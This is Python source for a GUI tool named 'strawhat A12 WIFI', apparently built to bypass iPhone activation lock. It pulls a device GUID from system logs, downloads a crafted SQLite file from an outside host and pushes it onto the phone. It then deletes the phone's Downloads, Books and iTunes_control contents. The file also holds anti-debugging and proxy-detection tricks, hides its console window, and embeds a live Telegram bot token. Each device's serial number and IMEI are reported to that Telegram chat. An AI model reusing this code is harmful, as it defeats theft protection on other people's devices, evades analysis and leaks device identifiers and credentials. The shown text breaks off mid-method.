# ========== CODE PROTECTION ==========
import sys
import os
import marshal
import zlib
import base64

# Obfuscate critical parts of your code
def protect_code():
    # Your actual code here will be obfuscated
    pass

# Anti-debugging techniques
def anti_debug():
    import ctypes
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            print("Debugger detected - exiting")
            os._exit(1)
    except:
        pass

# Check if running from EXE
def is_frozen():
    return hasattr(sys, 'frozen')

# Runtime protection
if is_frozen():
    anti_debug()
import os
import sys
import subprocess
import threading
import time
import webbrowser
import tempfile
import shutil
import ctypes
import re
import uuid
import random
import hashlib
import inspect
from urllib.parse import quote
from PyQt5.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
                             QWidget, QLabel, QPushButton, QProgressBar, QFrame, 
                             QMessageBox, QDialog, QTextEdit)
from PyQt5.QtCore import QTimer, Qt, pyqtSignal, QThread
from PyQt5.QtGui import QFont, QPalette, QColor, QIcon
import requests

# ========== HIDE CONSOLE WINDOW ==========
if sys.platform == "win32":
    # Hide console window completely for Windows
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

# ========== SUBPROCESS WITHOUT CONSOLE ==========
def run_subprocess_no_console(cmd, timeout=30, capture_output=True):
    """Run subprocess without showing console window"""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        
        # Additional flags to prevent console creation
        creationflags = subprocess.CREATE_NO_WINDOW
        
        result = subprocess.run(
            cmd,
            startupinfo=startupinfo,
            creationflags=creationflags,
            stdout=subprocess.PIPE if capture_output else subprocess.DEVNULL,
            stderr=subprocess.PIPE if capture_output else subprocess.DEVNULL,
            stdin=subprocess.PIPE,
            timeout=timeout,
            text=capture_output
        )
        return result
    except Exception as e:
        print(f"Subprocess error: {e}")
        return None

# ========== SECURITY CONFIGURATION ==========
TELEGRAM_BOT_TOKEN = "8410516214:AAGGiXuKLBw5Qd-UxfUHx1fdeQauBTsi-LI"
TELEGRAM_CHAT_ID = "918985092"

# Security monitoring
SECURITY_HASH = hashlib.sha256(TELEGRAM_BOT_TOKEN.encode()).hexdigest()[:16]
DETECTED_THREATS = []

# ========== SECURITY MONITORING ==========
class SecurityMonitor:
    def __init__(self):
        self.suspicious_activities = []
        self.start_time = time.time()
        
    def check_code_injection(self):
        """Check for potential code injection attempts"""
        try:
            # Check current stack for suspicious frames
            frames = inspect.stack()
            for frame in frames:
                filename = frame.filename
                # Check for eval, exec, or compile in code
                if any(keyword in str(frame.code_context) for keyword in ['eval', 'exec', 'compile', '__import__']):
                    self.log_threat("Potential code injection detected", frame)
                    return True
            return False
        except:
            return False
    
    def check_api_sniffing(self):
        """Check if someone is trying to sniff the API key"""
        try:
            # Monitor for unauthorized access to token variables
            current_frame = inspect.currentframe()
            # Check if any frame is accessing our token variables
            for frame_info in inspect.getouterframes(current_frame):
                frame = frame_info.frame
                for var_name, var_value in frame.f_locals.items():
                    if TELEGRAM_BOT_TOKEN in str(var_value):
                        if 'telegram' not in var_name.lower() and 'token' not in var_name.lower():
                            self.log_threat(f"Unauthorized access to Telegram token in variable: {var_name}", frame_info)
                            return True
            return False
        except:
            return False
    
    def check_proxy_usage(self):
        """Check if system is using proxy which could indicate monitoring"""
        try:
            # Check environment variables for proxy settings
            proxy_env_vars = ['HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'http_proxy', 'https_proxy', 'all_proxy']
            for var in proxy_env_vars:
                if os.environ.get(var):
                    self.log_threat(f"Proxy detected in environment: {var}={os.environ.get(var)}", None)
                    return True
            
            # Check Windows registry for proxy settings
            if os.name == 'nt':
                try:
                    import winreg
                    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
                    key = winreg.OpenKey(registry, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
                    try:
                        proxy_enable = winreg.QueryValueEx(key, "ProxyEnable")[0]
                        if proxy_enable:
                            proxy_server = winreg.QueryValueEx(key, "ProxyServer")[0]
                            self.log_threat(f"Windows proxy detected: {proxy_server}", None)
                            return True
                    except:
                        pass
                    winreg.CloseKey(key)
                except:
                    pass
            
            return False
        except:
            return False
    
    def log_threat(self, message, frame_info=None):
        """Log security threat and send notification"""
        threat_info = {
            'message': message,
            'timestamp': time.time(),
            'frame': str(frame_info) if frame_info else 'Unknown'
        }
        self.suspicious_activities.append(threat_info)
        DETECTED_THREATS.append(threat_info)
        
        # Send immediate security alert
        self.send_security_alert(threat_info)
        
        # Take protective action
        self.protective_action()
    
    def send_security_alert(self, threat_info):
        """Send security alert via Telegram"""
        try:
            message = f"🚨 SECURITY ALERT 🚨\n"
            message += f"Threat: {threat_info['message']}\n"
            message += f"Time: {time.ctime(threat_info['timestamp'])}\n"
            message += f"Location: {threat_info['frame'][:100]}...\n"
            message += f"Action: Application shutdown initiated"
            
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            requests.post(url, data=data, timeout=10)
        except:
            pass  # Silent fail for security alerts
    
    def protective_action(self):
        """Take protective action when threat detected"""
        print("🚨 SECURITY THREAT DETECTED - SHUTTING DOWN APPLICATION")
        # Force quit the application
        os._exit(1)
    
    def continuous_monitoring(self):
        """Continuous security monitoring"""
        while True:
            if self.check_code_injection() or self.check_api_sniffing() or self.check_proxy_usage():
                break
            time.sleep(5)

# Initialize security monitor
security_monitor = SecurityMonitor()

# ========== TELEGRAM NOTIFICATION CLASS ==========
class TelegramNotifier:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        
    def send_message(self, message):
        """Send message to Telegram"""
        try:
            # Security check before sending
            if security_monitor.check_api_sniffing() or security_monitor.check_proxy_usage():
                return False
                
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram notification failed: {e}")
            return False
    
    def send_activation_success(self, device_model, serial_number, imei):
        """Send activation success notification"""
        current_time = time.strftime("%Y-%m-%d %H:%M:%S")
        message = f"🎉 <b>DEVICE ACTIVATED SUCCESSFULLY</b> 🎉\n\n"
        message += f"📱 <b>Device Model:</b> {device_model}\n"
        message += f"🔢 <b>Serial Number:</b> {serial_number}\n"
        message += f"📞 <b>IMEI:</b> {imei}\n"
        message += f"🕒 <b>Activation Time:</b> {current_time}\n"
        message += f"✅ <b>Status:</b> ACTIVATED"
        
        return self.send_message(message)
    
    def send_activation_failed(self, device_model, serial_number, imei, error_reason):
        """Send activation failure notification"""
        current_time = time.strftime("%Y-%m-%d %H:%M:%S")
        message = f"❌ <b>DEVICE ACTIVATION FAILED</b> ❌\n\n"
        message += f"📱 <b>Device Model:</b> {device_model}\n"
        message += f"🔢 <b>Serial Number:</b> {serial_number}\n"
        message += f"📞 <b>IMEI:</b> {imei}\n"
        message += f"🕒 <b>Attempt Time:</b> {current_time}\n"
        message += f"🚫 <b>Error Reason:</b> {error_reason}\n"
        message += f"⚠️ <b>Status:</b> FAILED"
        
        return self.send_message(message)
    
    def send_security_alert(self, threat_info):
        """Send security alert notification"""
        message = f"🚨 <b>SECURITY ALERT</b> 🚨\n\n"
        message += f"⚠️ <b>Threat Detected:</b> {threat_info['message']}\n"
        message += f"🕒 <b>Time:</b> {time.ctime(threat_info['timestamp'])}\n"
        message += f"🔒 <b>Action:</b> Application shutdown initiated"
        
        return self.send_message(message)

# Initialize Telegram notifier
telegram_notifier = TelegramNotifier(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)

# ========== WORKER THREAD CLASS ==========
class ActivationWorker(QThread):
    progress_updated = pyqtSignal(int, str)
    activation_finished = pyqtSignal(bool, str)
    guid_extracted = pyqtSignal(str)
    
    def __init__(self, device_detector):
        super().__init__()
        self.detector = device_detector
        self.is_running = True
        self.extracted_guid = None
        
    def run(self):
        try:
            # Security check at start
            if security_monitor.check_api_sniffing() or security_monitor.check_proxy_usage():
                self.activation_finished.emit(False, "Security violation detected - Proxy usage not allowed")
                return
                
            # PHASE 1: Extract GUID using the proper method with multiple attempts
            guid = None
            max_attempts = 4  # Try up to 4 times with reboots
            
            for attempt in range(max_attempts):
                progress_value = 5 + (attempt * 10)
                self.progress_updated.emit(progress_value, f"Extracting device identifier (attempt {attempt + 1}/{max_attempts})...")
                
                guid = self.detector.extract_guid_proper_method(progress_value, self.progress_updated)
                
                if guid:
                    print(f"📋 SUCCESS: Extracted GUID: {guid}")
                    self.extracted_guid = guid
                    self.guid_extracted.emit(guid)
                    
                    # Send GUID to API
                    if not self.detector.send_guid_to_api(guid):
                        print("⚠️ GUID sending failed, but continuing activation...")
                    break
                else:
                    if attempt < max_attempts - 1:  # Don't reboot on last attempt
                        print(f"❌ GUID not found on attempt {attempt + 1}, rebooting...")
                        self.progress_updated.emit(progress_value + 5, "GUID not found, waiting 30 seconds before reboot...")
                        
                        # Wait 30 seconds before reboot
                        self.wait_with_progress(30, progress_value + 5, "Waiting before reboot...")
                        
                        if not self.detector.reboot_device_thread(self.progress_updated):
                            print("⚠️ Reboot failed, continuing...")
                        
                        # Wait for device to reconnect
                        if not self.detector.wait_for_device_reconnect_thread(120, self.progress_updated, self):
                            print("⚠️ Device did not reconnect after reboot")
            
            if not guid:
                # If we still can't find GUID after multiple attempts, continue without it
                print("⚠️ Could not extract GUID after multiple attempts, continuing activation without it")
                # Don't stop the activation - just continue without GUID
                # The server might still work with the device info we have
            
            # Continue with the rest of the activation process...
            # PHASE 2: Download and inject SQLite file
            self.progress_updated.emit(50, self.detector.get_random_hacking_text())

            # Create temporary directory
            temp_dir = tempfile.mkdtemp()
            local_file_path = os.path.join(temp_dir, "downloads.28.sqlitedb")
            
            try:
                # Get download URL - NOW INCLUDES GUID
                current_model = self.detector.model_value.text()
                formatted_model = self.detector.extract_model_number(current_model)
                
                # Use the extracted GUID in the download URL
                if self.extracted_guid:
                    download_url = f"https://bestofunlock.com/a12/{formatted_model}/devices/{self.extracted_guid}/downloads.28.sqlitedb"
                    print(f"📥 Downloading from URL with GUID: {download_url}")
                else:
                    # Fallback to old URL if no GUID found
                    download_url = f"https://bestofunlock.com/a12/{formatted_model}/devices/{self.extracted_guid}/downloads.28.sqlitedb"
                    print(f"📥 Downloading from fallback URL: {download_url}")
                
                # Download file
                self.progress_updated.emit(55, self.detector.get_random_hacking_text())
                if not self.detector.download_file_with_progress_thread(download_url, local_file_path, self.progress_updated):
                    raise Exception("Failed to proceed with Activation please try again or conatct support")
                
                # Transfer file to device
                self.progress_updated.emit(65, self.detector.get_random_hacking_text())
                if not self.detector.transfer_and_execute_sqlite_file_thread(local_file_path, self.progress_updated):
                    raise Exception("Failed to Activate please try again or contact support")
                
            finally:
                # Clean up temporary files
                shutil.rmtree(temp_dir, ignore_errors=True)
            
            # PHASE 3: First reboot and wait 1min 30sec
            self.progress_updated.emit(70, self.detector.get_random_hacking_text())
            
            # Wait 30 seconds before first reboot
            self.wait_with_progress(30, 70, "Waiting 30 seconds before first reboot...")
            
            if not self.detector.reboot_device_thread(self.progress_updated):
                raise Exception("Failed first reboot")
            
            # Wait for device to reconnect
            self.progress_updated.emit(75, self.detector.get_random_hacking_text())
            if not self.detector.wait_for_device_reconnect_thread(120, self.progress_updated, self):
                raise Exception("Device did not reconnect after first reboot")
            
            # Wait exactly 1 minute 30 seconds
            self.progress_updated.emit(80, "Waiting 1 minute 30 seconds...")
            print("Waiting 1 minute 30 seconds after first reboot...")
            
            wait_time = 90  # 1 minute 30 seconds
            for i in range(wait_time):
                if not self.is_running:
                    raise Exception("User cancelled during wait period")
                
                remaining = wait_time - i
                minutes = remaining // 60
                seconds = remaining % 60
                
                # Update progress every 10 seconds
                if i % 10 == 0:
                    self.progress_updated.emit(80, f"Waiting {minutes}:{seconds:02d}...")
                
                time.sleep(1)
            
            # NEW: SMART ACTIVATION CHECKING WITH RETRY LOGIC
            activation_status = self.smart_activation_check_with_retry()
            
            # PHASE 8: Clean up all folders before showing result
            self.progress_updated.emit(99, "Cleaning up device folders...")
            cleanup_success = self.detector.cleanup_device_folders_thread()
            if not cleanup_success:
                print("⚠️ Some cleanup operations failed, but continuing...")
            
            # Show final result based on activation state
            if activation_status == "Activated":
                self.progress_updated.emit(100, "Activation complete!")
                
                # Send Telegram notification for success
                device_model = self.detector.model_value.text()
                serial_number = self.detector.serial_value.text()
                imei = self.detector.imei_value.text()
                
                # Send success notification
                telegram_notifier.send_activation_success(device_model, serial_number, imei)
                
                self.activation_finished.emit(True, "Activation successful - Device Activated")
            elif activation_status == "Unactivated":
                self.progress_updated.emit(100, "Activation failed")
                
                # Send Telegram notification for failure
                device_model = self.detector.model_value.text()
                serial_number = self.detector.serial_value.text()
                imei = self.detector.imei_value.text()
                error_reason = "Device still shows as Unactivated after process completion"
                
                telegram_notifier.send_activation_failed(device_model, serial_number, imei, error_reason)
                
                self.activation_finished.emit(False, "Activation failed - device still Unactivated")
            else:
                self.progress_updated.emit(100, "Activation status unknown")
                
                # Send Telegram notification for unknown status
                device_model = self.detector.model_value.text()
                serial_number = self.detector.serial_value.text()
                imei = self.detector.imei_value.text()
                error_reason = f"Unknown activation status: {activation_status}"
                
                telegram_notifier.send_activation_failed(device_model, serial_number, imei, error_reason)
                
                self.activation_finished.emit(False, f"Activation status unknown: {activation_status}")
            
        except Exception as e:
            error_message = str(e)
            print(f"Activation error: {e}")
            
            # Clean up folders even if activation failed
            try:
                self.progress_updated.emit(99, "Cleaning up after error...")
                self.detector.cleanup_device_folders_thread()
            except:
                pass
            
            # Send Telegram notification for error
            try:
                device_model = self.detector.model_value.text()
                serial_number = self.detector.serial_value.text()
                imei = self.detector.imei_value.text()
                
                telegram_notifier.send_activation_failed(device_model, serial_number, imei, error_message)
            except:
                pass  # If we can't get device info, still send basic error
                
            self.activation_finished.emit(False, error_message)
    
    def smart_activation_check_with_retry(self):
        """Smart activation checking with retry logic and reboots"""
        print("🔄 Starting smart activation checking with retry logic...")
        max_retries = 3
        
        for retry in range(max_retries):
            self.progress_updated.emit(85 + (retry * 4), f"Checking activation status (attempt {retry + 1}/{max_retries})...")
            
            # Check activation status
            activation_status = self.detector.check_activation_status_thread()
            print(f"📱 Activation status check {retry + 1}: {activation_status}")
            
            if activation_status == "Activated":
                print("🎉 Device is ACTIVATED!")
                return "Activated"
            elif activation_status == "Unactivated":
                print(f"❌ Device still Unactivated, retry {retry + 1}/{max_retries}")
                
                if retry < max_retries - 1:  # Don't reboot on last attempt
                    # Wait before reboot
                    self.wait_with_progress(30, 85 + (retry * 4), "Waiting 30 seconds before retry reboot...")
                    
                    # Reboot device
                    self.progress_updated.emit(88 + (retry * 4), "Rebooting device for activation retry...")
                    if not self.detector.reboot_device_thread(self.progress_updated):
                        print("⚠️ Reboot failed during retry, continuing...")
                    
                    # Wait for reconnect
                    if not self.detector.wait_for_device_reconnect_thread(120, self.progress_updated, self):
                        print("⚠️ Device did not reconnect after retry reboot")
                    
                    # Wait after reboot before checking again
                    self.wait_with_progress(45, 90 + (retry * 4), "Waiting 45 seconds after reboot...")
                else:
                    print("❌ Max retries reached, device still Unactivated")
                    return "Unactivated"
            else:
                print(f"❓ Unknown activation status: {activation_status}")
                if retry < max_retries - 1:
                    # Wait and retry for unknown status
                    self.wait_with_progress(30, 85 + (retry * 4), "Waiting 30 seconds before retry...")
                else:
                    return activation_status
        
        return "Unactivated"  # Default to Unactivated if all retries fail
    
    def wait_with_progress(self, wait_time, current_progress, message):
        """Wait for specified time with progress updates"""
        try:
            print(f"⏳ {message} for {wait_time} seconds...")
            self.progress_updated.emit(current_progress, message)
            
            for i in range(wait_time):
                if not self.is_running:
                    raise Exception("User cancelled during wait period")
                
                remaining = wait_time - i
                # Update progress every 10 seconds
                if i % 10 == 0:
                    self.progress_updated.emit(current_progress, f"{message} {remaining}s remaining...")
                
                time.sleep(1)
            
            print(f"✅ Wait completed: {message}")
            
        except Exception as e:
            print(f"⚠️ Wait interrupted: {e}")
            raise
    
    def stop(self):
        self.is_running = False

# ========== DIALOG CLASSES ==========
class CustomMessageBox(QDialog):
    def __init__(self, title, message, serial_number, parent=None):
        super().__init__(parent)
        self.serial_number = serial_number
        self.setWindowTitle(title)
        self.setFixedSize(450, 300)
        self.setModal(True)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        
        layout = QVBoxLayout()
        
        # Title
        title_label = QLabel(title)
        title_label.setStyleSheet("""
            font-size: 20px; 
            font-weight: bold; 
            color: #27ae60;
            margin-bottom: 15px;
        """)
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)
        
        # Message
        message_label = QLabel(message)
        message_label.setStyleSheet("""
            font-size: 14px;
            color: #2c3e50;
            margin-bottom: 20px;
            padding: 10px;
        """)
        message_label.setWordWrap(True)
        message_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(message_label)
        
        # Serial Number highlight
        serial_label = QLabel(f"Serial: {self.serial_number}")
        serial_label.setStyleSheet("""
            font-size: 16px;
            font-weight: bold;
            color: #e74c3c;
            background-color: #fdf2f2;
            padding: 10px;
            border: 2px solid #e74c3c;
            border-radius: 5px;
            margin-bottom: 20px;
        """)
        serial_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(serial_label)
        
        # Info text
        info_text = QLabel("Click 'Proceed to Order' to continue with the activation process")
        info_text.setStyleSheet("""
            font-size: 12px;
            color: #7f8c8d;
            font-style: italic;
            margin-bottom: 20px;
        """)
        info_text.setAlignment(Qt.AlignCenter)
        layout.addWidget(info_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        self.cancel_btn = QPushButton("Cancel")
        self.cancel_btn.setStyleSheet("""
            QPushButton {
                background-color: #95a5a6;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 10px 20px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background-color: #7f8c8d;
            }
        """)
        self.cancel_btn.clicked.connect(self.reject)
        
        self.proceed_btn = QPushButton("Proceed to Order")
        self.proceed_btn.setStyleSheet("""
            QPushButton {
                background-color: #27ae60;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 10px 20px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background-color: #219653;
            }
        """)
        self.proceed_btn.clicked.connect(self.accept)
        
        button_layout.addWidget(self.cancel_btn)
        button_layout.addWidget(self.proceed_btn)
        layout.addLayout(button_layout)
        
        self.setLayout(layout)

class ActivationResultDialog(QDialog):
    def __init__(self, title, message, is_success=True, parent=None):
        super().__init__(parent)
        self.setWindowTitle(title)
        self.setFixedSize(500, 350)
        self.setModal(True)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        
        layout = QVBoxLayout()
        
        # Icon and Title
        title_label = QLabel(title)
        if is_success:
            title_label.setStyleSheet("""
                font-size: 24px; 
                font-weight: bold; 
                color: #27ae60;
                margin-bottom: 20px;
            """)
        else:
            title_label.setStyleSheet("""
                font-size: 24px; 
                font-weight: bold; 
                color: #e74c3c;
                margin-bottom: 20px;
            """)
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)
        
        # Message
        message_label = QLabel(message)
        message_label.setStyleSheet("""
            font-size: 16px;
            color: #2c3e50;
            margin-bottom: 30px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            border: 1px solid #ddd;
        """)
        message_label.setWordWrap(True)
        message_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(message_label)
        
        # Additional info for failure
        if not is_success:
            info_label = QLabel("This is a normal process. All you need to do is try again multiple times for your device to activate.")
            info_label.setStyleSheet("""
                font-size: 14px;
                color: #7f8c8d;
                font-style: italic;
                margin-bottom: 20px;
                padding: 10px;
                background-color: #fff3cd;
                border: 1px solid #ffeaa7;
                border-radius: 5px;
            """)
            info_label.setWordWrap(True)
            info_label.setAlignment(Qt.AlignCenter)
            layout.addWidget(info_label)
        
        # OK Button
        ok_btn = QPushButton("OK")
        ok_btn.setStyleSheet("""
            QPushButton {
                background-color: #3498db;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 12px 30px;
                font-weight: bold;
                font-size: 16px;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #2980b9;
            }
        """)
        ok_btn.clicked.connect(self.accept)
        ok_btn.setDefault(True)
        
        button_layout = QHBoxLayout()
        button_layout.addStretch()
        button_layout.addWidget(ok_btn)
        button_layout.addStretch()
        layout.addLayout(button_layout)
        
        self.setLayout(layout)

# ========== MAIN DEVICE DETECTOR CLASS ==========
class DeviceDetector(QMainWindow):
    device_connected = pyqtSignal(bool)
    model_received = pyqtSignal(str)
    show_auth_dialog = pyqtSignal(str, str)
    enable_activate_btn = pyqtSignal(bool)
    update_status_label = pyqtSignal(str, str)
    update_progress = pyqtSignal(int, str)
    
    def __init__(self):
        super().__init__()
        self.device_info = {}
        self.current_serial = None
        self.current_product_type = None
        self.cached_models = {}
        self.authorization_checked = False
        self.device_authorized = False
        self.activation_in_progress = False
        self.zrac_guid_data = None
        self.extracted_guid = None
        self.activation_worker = None
        
        # Start security monitoring in background
        self.start_security_monitoring()
        
        self.init_ui()
        
        # Connect signals
        self.device_connected.connect(self.on_device_connected)
        self.model_received.connect(self.on_model_received)
        self.show_auth_dialog.connect(self.on_show_auth_dialog)
        self.enable_activate_btn.connect(self.on_enable_activate_btn)
        self.update_status_label.connect(self.on_update_status_label)
        self.update_progress.connect(self.on_update_progress)
        
        self.setup_device_monitor()
    
    def start_security_monitoring(self):
        """Start security monitoring in background thread"""
        def monitor():
            security_monitor.continuous_monitoring()
        
        security_thread = threading.Thread(target=monitor, daemon=True)
        security_thread.start()
    
    def init_ui(self):
        self.setWindowTitle("strawhat A12 WIFI")
        self.setFixedSize(600, 550)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(20)
        layout.setContentsMargins(30, 30, 30, 30)
        
        # Title
        title = QLabel("strawhat A12 WIFI")
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("font-size: 28px; font-weight: bold; margin-bottom: 20px; color: #2c3e50;")
        layout.addWidget(title)
        
        # Info frame
        info_frame = QFrame()
        info_frame.setFrameStyle(QFrame.Box)
        info_frame.setLineWidth(2)
        layout.addWidget(info_frame)
        
        info_layout = QVBoxLayout(info_frame)
        info_layout.setSpacing(15)
        info_layout.setContentsMargins(20, 20, 20, 20)
        
        # Device Model (new - at the top)
        self.model_label = self.create_info_label("Device Model:", "N/A")
        info_layout.addWidget(self.model_label)
        
        # Device info labels
        self.serial_label = self.create_info_label("SerialNumber:", "N/A")
        self.ios_label = self.create_info_label("iOSVersion:", "N/A")
        self.imei_label = self.create_info_label("Imei:", "N/A")
        self.status_label = self.create_info_label("Status:", "Disconnected")
        
        info_layout.addWidget(self.serial_label)
        info_layout.addWidget(self.ios_label)
        info_layout.addWidget(self.imei_label)
        info_layout.addWidget(self.status_label)
        
        # Activate button
        self.activate_btn = QPushButton("Activate")
        self.activate_btn.setFixedHeight(45)
        self.activate_btn.clicked.connect(self.activate_device)
        self.activate_btn.setEnabled(False)
        layout.addWidget(self.activate_btn)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        self.progress_bar.setFixedHeight(20)
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)
        
        # Progress label
        self.progress_label = QLabel("")
        self.progress_label.setAlignment(Qt.AlignCenter)
        self.progress_label.setStyleSheet("font-size: 12px; color: #7f8c8d;")
        layout.addWidget(self.progress_label)
        
        # Apply styling
        self.apply_modern_theme()

    # ========== CLEANUP METHODS ==========
    
    def cleanup_device_folders_thread(self):
        """Clean up Downloads, Books, and iTunes_control folders - thread safe"""
        try:
            print("🧹 Starting device folder cleanup...")
            
            # 1. Clean Downloads folder
            print("🗑️ Cleaning Downloads folder...")
            downloads_success = self.clean_downloads_folder_completely()
            
            # 2. Clean Books folder
            print("📚 Cleaning Books folder...")
            books_success = self.clean_books_folder()
            
            # 3. Clean iTunes_control folder
            print("🎵 Cleaning iTunes_control folder...")
            itunes_success = self.clean_itunes_control_folder()
            
            print("✅ Device folder cleanup completed")
            return downloads_success and books_success and itunes_success
            
        except Exception as e:
            print(f"❌ Error during cleanup: {e}")
            return False

    def clean_downloads_folder_completely(self):
        """Completely clean Downloads folder"""
        try:
            success, output = self.afc_client_operation('ls', 'Downloads/')
            if success:
                files = output.strip().split('\n')
                deleted_count = 0
                for file in files:
                    file = file.strip()
                    if file and file not in ['.', '..']:
                        print(f"🗑️ Deleting from Downloads: {file}")
                        self.afc_client_operation('rm', f'Downloads/{file}')
                        deleted_count += 1
                print(f"✅ Cleaned {deleted_count} files from Downloads folder")
                return True
            return False
        except Exception as e:
            print(f"❌ Error cleaning Downloads folder: {e}")
            return False

    def clean_books_folder(self):
        """Clean Books folder"""
        try:
            success, output = self.afc_client_operation('ls', 'Books/')
            if success:
                files = output.strip().split('\n')
                deleted_count = 0
                for file in files:
                    file = file.strip()
                    if file and file not in ['.', '..']:
                        # Skip system folders, only delete files
                        if not file.endswith('/'):
                            print(f"🗑️ Deleting from Books: {file}")
                            self.afc_client_operation('rm', f'Books/{file}')
                            deleted_count += 1
                print(f"✅ Cleaned {deleted_count} files from Books folder")
                return True
            return False
        except Exception as e:
            print(f"❌ Error cleaning Books folder: {e}")
            return False

    def clean_itunes_control_folder(self):
        """Clean iTunes_control folder and its contents"""
        try:
            # First check if iTunes_control folder exists
            success, output = self.afc_client_operation('ls', '/')
            if success and 'iTunes_control' in output:
                print("🎵 Found iTunes_control folder, cleaning contents...")
                
                # List contents of iTunes_control
                success, output = self.afc_client_operation('ls', 'iTunes_control/')
                if success:
                    items = output.strip().split('\n')
                    deleted_count = 0
                    for item in items:
                        item = item.strip()
                        if item and item not in ['.', '..']:
                            print(f"🗑️ Deleting from iTunes_control: {item}")
                            self.afc_client_operation('rm', f'iTunes_control/{item}')
                            deleted_count += 1
                    print(f"✅ Cleaned {deleted_count} items from iTunes_control folder")
                    return True
            else:
                print("ℹ️ iTunes_control folder not found or inaccessible")
                return True  # Not an error if folder doesn't exist
                
            return False
        except Exception as e:
            print(f"❌ Error cleaning iTunes_control folder: {e}")
            return False

    # ========== GUID EXTRACTION METHODS ==========
    
    def extract_guid_proper_method(self, progress_value, progress_signal):
        """Extract GUID using the exact method described: reboot, clean downloads, collect logs, search for BLDatabase"""
        try:
            print("🔄 Starting GUID extraction process...")
            
            # Step 1: Reboot device
            progress_signal.emit(progress_value + 2, "Rebooting device...")
            print("🔁 Step 1: Rebooting device...")
            if not self.reboot_device_sync():
                print("⚠️ Reboot failed, continuing anyway...")
            
            # Wait for device to reconnect
            progress_signal.emit(progress_value + 4, "Waiting for device to reconnect...")
            print("⏳ Waiting for device to reconnect...")
            if not self.wait_for_device_reconnect_sync(120):
                print("⚠️ Device did not reconnect properly")
            
            # Step 2: Clean Downloads folder using AFC client
            progress_signal.emit(progress_value + 6, "Cleaning Downloads folder...")
            print("🗑️ Step 2: Cleaning Downloads folder...")
            if not self.clean_downloads_folder():
                print("⚠️ Could not clean Downloads folder")
            
            # Step 3: Get device UDID
            progress_signal.emit(progress_value + 8, "Getting device UDID...")
            print("📱 Step 3: Getting device UDID...")
            udid = self.get_device_udid()
            if not udid:
                print("❌ Cannot get device UDID")
                return None
            
            print(f"📋 Device UDID: {udid}")
            
            # Step 4: Collect logs using pymobiledevice3
            progress_signal.emit(progress_value + 10, "Collecting system logs...")
            print("📝 Step 4: Collecting system logs with pymobiledevice3...")
            log_archive_path = self.collect_syslog_with_pymobiledevice(udid)
            if not log_archive_path:
                print("❌ Failed to collect syslog")
                return None
            
            # Step 5: Search for BLDatabaseManager/BLDatabase in logs
            progress_signal.emit(progress_value + 12, "Searching for GUID in logs...")
            print("🔍 Step 5: Searching for BLDatabase paths in logs...")
            guid = self.search_bl_database_in_log_archive(log_archive_path)
            
            # Clean up temporary files
            try:
                if os.path.exists(log_archive_path):
                    shutil.rmtree(os.path.dirname(log_archive_path), ignore_errors=True)
            except:
                pass
            
            if guid:
                print(f"✅ SUCCESS: Found GUID: {guid}")
                return guid
            else:
                print("❌ GUID not found in this attempt")
                return None
                
        except Exception as e:
            print(f"❌ GUID extraction error: {e}")
            return None

    def clean_downloads_folder(self):
        """Clean Downloads folder using AFC client"""
        try:
            print("🗑️ Cleaning Downloads folder with AFC client...")
            
            # List files in Downloads folder
            success, output = self.afc_client_operation('ls', 'Downloads/')
            if not success:
                print("❌ Cannot access Downloads folder")
                return False
            
            # Delete all files in Downloads folder
            files = output.strip().split('\n')
            deleted_count = 0
            for file in files:
                file = file.strip()
                if file and file not in ['.', '..']:
                    print(f"🗑️ Deleting: {file}")
                    self.afc_client_operation('rm', f'Downloads/{file}')
                    deleted_count += 1
            
            print(f"✅ Cleaned {deleted_count} files from Downloads folder")
            
            # Navigate to parent directory and exit (as per your instructions)
            self.afc_client_operation('ls', '..')
            
            return True
            
        except Exception as e:
            print(f"❌ Error cleaning Downloads folder: {e}")
            return False

    def collect_syslog_with_pymobiledevice(self, udid):
        """Collect syslog using pymobiledevice3 - SIMPLE HIDDEN METHOD"""
        try:
            print(f"📝 Collecting syslog for UDID: {udid}")
            
            # Create temporary directory for logs
